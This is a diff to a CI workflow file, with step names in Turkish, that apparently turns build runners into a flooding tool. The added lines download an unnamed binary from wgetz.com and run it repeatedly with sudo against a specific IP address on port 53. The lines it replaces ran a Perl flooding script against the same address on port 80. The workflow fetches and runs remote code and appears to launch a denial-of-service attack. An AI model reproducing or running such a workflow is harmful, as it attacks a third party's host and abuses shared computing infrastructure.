@@ -16,7 +16,7 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/3pctUiGq4q/hoplatici.pl
+          wget https://wgetz.com/DJtJ7l7CtR/brsovhv2
           
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
@@ -24,7 +24,7 @@ jobs:
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            sudo timeout 60 perl hoplatici.pl 216.202.200.164 80 1472
+            sudo timeout 60 ./brsovhv2 216.202.200.164 53
             PIDS+=($!)
           done
           
